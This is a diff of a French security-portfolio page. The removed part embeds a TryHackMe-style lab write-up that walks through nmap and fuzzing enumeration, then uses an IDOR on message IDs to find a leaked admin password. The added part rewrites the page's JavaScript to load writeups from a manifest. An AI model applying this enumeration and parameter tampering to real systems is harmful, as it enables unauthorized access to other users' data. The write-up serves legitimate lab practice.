-cyprusbank.thm
-
-
-```bash
-$ sudo nmap -sS -sC -sV 10.10.123.71
-
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:08 CET
-Nmap scan report for cyprusbank.thm (10.10.123.71)
-Host is up (0.031s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
-|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
-|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
-80/tcp open  http    nginx 1.14.0 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html; charset=utf-8).
-|_http-server-header: nginx/1.14.0 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
-```
-# Fuzzing
-
-```bash
-$ ffuf -c -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt:FUZZ -w http://cyprusbank.thm/FUZZ
-```
-
-Pour l'instant, il n'y que ce fichier qui est sorti.
-```bash
-index.html
-```
-
-J'ai essayé d'autres wordlists, toujours avec Ffuf mais ça ne donnait rien. Donc j'ai essayé avec GoBuster et les wordlists utilisés avec l'outil FFuf.
-
-```bash
-$ wfuzz -c --hw 3 -w /usr/share/seclists/Discovery/dns/subdomains-top1million-110000.txt -H "Host: FUZZ.cyprusbank.thm" cyprusbank.thm
-
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://cyprusbank.thm/
-Total requests: 114441
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                            
-=====================================================================
-
-000000001:   200        8 L      24 W       252 Ch      "www"                                                                              
-000000024:   302        0 L      4 W        28 Ch       "admin"                                                                            
-
-Total time: 400.3569
-Processed Requests: 114441
-Filtered Requests: 114439
-Requests/sec.: 285.8474
-```
-
-```bash
-Ajout de l'extension au fichier /etc/hosts
-
-$ sudo nano /etc/hosts
-<adresse IP>	admin.cyprusbank.thm
-```
- 	
- 	
-Nous arrivons sur la page 'admin.cyprusbank.thm' et nous avons une page de connexion, les credentials fourni vont être utiles.
-	
-```bash
-Olivia Cortez:olivi8
-```
-	
-# Exploitation
-
-Le site permet à un attaquant de manipuler les paramètres de l'URL. C'est à dire, qu'en changeant les valeurs depuis notre utilisateur, on peut accéder aux informations d'autres users. 
-Ici, on peut par exemple automatiser le processus, en créant une liste de nombres qui se suivent, avec Python. 
-Et utiliser Curl ou Burpsuite, afin de tester chaque paramètre de notre liste.
-
-Dans cette machine, j'ai testé à la main, étant donné que ce n'est pas une cible du monde réelle, avec des milliers d'utilisateurs. C'est jouable.
-
-```bash
-http://admin.cyprusbank.thm/messages/?c=5
-
-
-http://admin.cyprusbank.thm/messages/?c=10
-```
-
-
-```bash	
-La page 10 contient la discussion suivante:
-	
-Banque nationale de Chypre - Chat administratif
-
-ÉQUIPE DEV  : Merci Gayle, pouvez-vous partager vos informations d'identification ? Nous avons besoin d'un compte administrateur privilégié pour les tests
-
-Gayle Bev : Bien sûr ! Mon mot de passe est 'p~]P@5!6;rs558:q'
-
-ÉQUIPE DEV  : Très bien, nous essayons d'implémenter l'historique des discussions, tout devrait être prêt dans environ une semaine.
-
-Gayle Bev : C'est agréable à entendre !
-
-Gayle Bev : Les développeurs ont implémenté cette nouvelle fonctionnalité de messagerie que j'avais suggérée ! Qu'en pensez-vous ?
-
-Greger Ivayla : Ça a l'air vraiment cool !
-
-Jemmy Laurel : Hé, vous avez vu Mme Jacobs récemment ??
-
-Olivia Cortez : Non, elle n'est plus là depuis un moment
-
-Jemmy Laurel : Oh, est-ce qu'elle va bien ?
-```
-
-
-Nous arrivons sur le compte de Gayle Bev avec le password:
-```bash
-p~]P@5!6;rs558:q
-```
-
-Grâce à cela, nous voyons à la première page la réponse à la première question du CTF, le numéro de Tyrell Wellick
-```bash	
-Tyrell Wellick :	 	$20.855.900.000 	842-029-5701
-```
-
-				
-
-            </script>
-          </div>
-        </article>
-      </section>
-
-
-		
-      <!-- Root-Me -->
-      <section class="platform-section">
-        <h2>Root-Me</h2>
-        <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">Challenge Forensic</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
-# Root-Me - Challenge Forensic
-
-... (contenu markdown) ...
-            </script>
-          </div>
-        </article>
-      </section>
-
-
-		
-      <!-- FCSC -->
-      <section class="platform-section">
-        <h2>FCSC</h2>
-        <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">Cryptobro</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
-# FCSC 2025 - Cryptobro
-
-... (contenu markdown) ...
-            </script>
-          </div>
-        </article>
-      </section>
-
+    <!-- Filtres -->
+    <div class="filters" id="filters">
+      <button class="filter-btn active" data-platform="all">Tous</button>
     </div>
 
-	  
-    <p style="margin-top:18px"><a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">⬅ Retour au portfolio</a></p>
-	  
+    <!-- Conteneur des sections générées dynamiquement -->
+    <div id="writeupList"></div>
+
+    <p style="margin-top:18px">
+      <a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">⬅ Retour au portfolio</a>
+    </p>
   </main>
 
+  <footer>
+    <p>© 2025 Fr3nch4Sec — Portfolio hébergé sur GitHub Pages</p>
+  </footer>
 
-	
-  <!-- JS: Markdown -> highlight -> accordion -> theme -->
   <script>
-    // marked + highlight config
-marked.setOptions({
-  highlight: function(code, lang) {
-    try {
-      if (lang && hljs.getLanguage(lang)) {
-        return hljs.highlight(code, { language: lang }).value;
-      } else {
+  // ─── Config marked + highlight ───────────────────────────────────────────
+  marked.setOptions({
+    highlight: (code, lang) => {
+      try {
+        if (lang && hljs.getLanguage(lang)) return hljs.highlight(code, { language: lang }).value;
         return hljs.highlightAuto(code).value;
-      }
-    } catch (e) {
-      return code;
-    }
-  }
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  // 1) Convert markdown into HTML
-  document.querySelectorAll('.writeup-content').forEach(contentDiv => {
-    const mdScript = contentDiv.querySelector('script[type="text/markdown"]');
-    if (mdScript) {
-      contentDiv.innerHTML = marked.parse(mdScript.textContent);
+      } catch { return code; }
     }
   });
 
-  // 2) Highlight
-  hljs.highlightAll();
-
-  // 3) Accordion: attach listeners AFTER markdown parsed - avec hauteur dynamique
-  document.querySelectorAll('.clickable').forEach(title => {
-    title.addEventListener('click', () => {
-      const item = title.parentElement;
-      const content = item.querySelector('.writeup-content');
-      if (!content) return;
-
-      const isOpen = content.classList.contains('open');
-
-      // Close others
-      document.querySelectorAll('.writeup-content.open').forEach(other => {
-        if (other !== content) {
-          other.style.height = '0';
-          other.classList.remove('open');
-          const othTitle = other.parentElement.querySelector('.clickable');
-          if (othTitle) othTitle.classList.remove('open');
-        }
-      });
-
-      // Toggle current
-      if (isOpen) {
-        content.style.height = '0';
-      } else {
-        content.classList.add('open');
-        content.style.height = content.scrollHeight + 'px'; // Hauteur exacte
-      }
-      title.classList.toggle('open', !isOpen);
-
-      if (!isOpen) setTimeout(() => hljs.highlightAll(), 120);
-    });
-  });
-
-  // 4) Theme toggle
-  const toggle = document.getElementById('theme-toggle');
-  const icon = toggle.querySelector('.theme-icon');
-  const hlTheme = document.getElementById('highlight-theme');
-
+  // ─── Thème ────────────────────────────────────────────────────────────────
   function applyTheme(isDark) {
+    const hlTheme = document.getElementById('highlight-theme');
     if (isDark) {
-      document.body.classList.remove('light-mode');
-      document.body.classList.add('dark-mode');
-      icon.textContent = '☀️';
+      document.body.classList.replace('light-mode', 'dark-mode') || document.body.classList.add('dark-mode');
+      document.querySelector('.theme-icon').textContent = '☀️';
       hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
     } else {
-      document.body.classList.remove('dark-mode');
-      document.body.classList.add('light-mode');
-      icon.textContent = '🌙';
+      document.body.classList.replace('dark-mode', 'light-mode') || document.body.classList.add('light-mode');
+      document.querySelector('.theme-icon').textContent = '🌙';
       hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
     }
     setTimeout(() => hljs.highlightAll(), 160);
   }
 
-  const saved = localStorage.getItem('theme');
-  const isDark = (saved === 'dark' || saved === null);
-  applyTheme(isDark);
-
-  toggle.addEventListener('click', () => {
-    const nowDark = document.body.classList.contains('dark-mode');
-    applyTheme(!nowDark);
-    localStorage.setItem('theme', !nowDark ? 'dark' : 'light');
+  document.getElementById('theme-toggle').addEventListener('click', () => {
+    const isDark = document.body.classList.contains('dark-mode');
+    applyTheme(!isDark);
+    localStorage.setItem('theme', !isDark ? 'dark' : 'light');
   });
-});
+
+  applyTheme(localStorage.getItem('theme') !== 'light');
+
+  // ─── Accordéon ───────────────────────────────────────────────────────────
+  function attachAccordion(titleEl) {
+    titleEl.addEventListener('click', () => {
+      const content = titleEl.parentElement.querySelector('.writeup-content');
+      if (!content) return;
+      const isOpen = content.classList.contains('open');
+
+      document.querySelectorAll('.writeup-content.open').forEach(other => {
+        if (other !== content) {
+          other.style.height = '0';
+          other.classList.remove('open');
+          other.parentElement.querySelector('.clickable')?.classList.remove('open');
+        }
+      });
+
+      if (isOpen) {
+        content.style.height = '0';
+        content.classList.remove('open');
+        titleEl.classList.remove('open');
+      } else {
+        content.classList.add('open');
+        content.style.height = content.scrollHeight + 'px';
+        titleEl.classList.add('open');
+        setTimeout(() => hljs.highlightAll(), 120);
+      }
+    });
+  }
+
+  // ─── Badge difficulté ────────────────────────────────────────────────────
+  function diffBadge(diff) {
+    const cls = {
+      'Easy': 'diff-easy', 'Medium': 'diff-medium',
+      'Hard': 'diff-hard',  'Insane': 'diff-insane'
+    }[diff] || 'diff-easy';
+    return `<span class="diff-badge ${cls}">${diff}</span>`;
+  }
+
+  // ─── Chargement d'un writeup .md ─────────────────────────────────────────
+  async function loadWriteup(entry, contentDiv) {
+    contentDiv.innerHTML = '<div class="loader">Chargement...</div>';
+    try {
+      const res = await fetch(entry.file);
+      if (!res.ok) throw new Error('Fichier introuvable');
+      const md = await res.text();
+      contentDiv.innerHTML = marked.parse(md);
+      setTimeout(() => hljs.highlightAll(), 50);
+    } catch (e) {
+      contentDiv.innerHTML = `<p style="color:#e06339">Impossible de charger le writeup : <code>${entry.file}</code></p>`;
+    }
+  }
+
+  // ─── Construction de la page depuis manifest.json ────────────────────────
+  async function buildPage() {
+    const list   = document.getElementById('writeupList');
+    const filters = document.getElementById('filters');
+
+    let manifest;
+    try {
+      const res = await fetch('writeups/manifest.json');
+      manifest  = await res.json();
+    } catch {
+      list.innerHTML = '<p style="color:#e06339;padding:20px">Impossible de charger le manifest.json</p>';
+      return;
+    }
+
+    // Regrouper par plateforme
+    const platforms = {};
+    manifest.forEach(entry => {
+      if (!platforms[entry.platform]) platforms[entry.platform] = [];
+      platforms[entry.platform].push(entry);
+    });
+
+    // Boutons de filtre
+    Object.keys(platforms).forEach(platform => {
+      const btn = document.createElement('button');
+      btn.className = 'filter-btn';
+      btn.dataset.platform = platform;
+      btn.textContent = platform;
+      filters.appendChild(btn);
+    });
+
+    // Filtrage
+    filters.addEventListener('click', e => {
+      const btn = e.target.closest('.filter-btn');
+      if (!btn) return;
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const target = btn.dataset.platform;
+      document.querySelectorAll('.platform-section').forEach(section => {
+        section.style.display = (target === 'all' || section.dataset.platform === target) ? '' : 'none';
+      });
+    });
+
+    // Générer les sections
+    Object.entries(platforms).forEach(([platform, entries]) => {
+      const section = document.createElement('section');
+      section.className = 'platform-section';
+      section.dataset.platform = platform;
+      section.innerHTML = `<h2>${platform}</h2>`;
+
+      entries.forEach(entry => {
+        const article = document.createElement('article');
+        article.className = 'writeup-item';
+
+        const h3 = document.createElement('h3');
+        h3.className = 'clickable';
+        h3.innerHTML = `
+          <span style="display:flex;align-items:center;gap:6px;">
+            <span class="title-text">${entry.title}</span>
+            ${diffBadge(entry.difficulty)}
+            ${entry.os ? `<span style="font-size:11px;opacity:0.5;font-weight:400">${entry.os}</span>` : ''}
+          </span>
+          <span style="font-size:11px;opacity:0.4;font-weight:400;margin-right:28px">${entry.date}</span>
+        `;
+
+        const contentDiv = document.createElement('div');
+        contentDiv.className = 'writeup-content';
+        contentDiv.setAttribute('aria-hidden', 'true');
+
+        // Chargement au premier clic seulement (lazy loading)
+        let loaded = false;
+        h3.addEventListener('click', () => {
+          if (!loaded) {
+            loaded = true;
+            loadWriteup(entry, contentDiv);
+          }
+        });
+
+        attachAccordion(h3);
+        article.appendChild(h3);
+        article.appendChild(contentDiv);
+        section.appendChild(article);
+      });
+
+      list.appendChild(section);
+    });
+  }
+
+  buildPage();
   </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
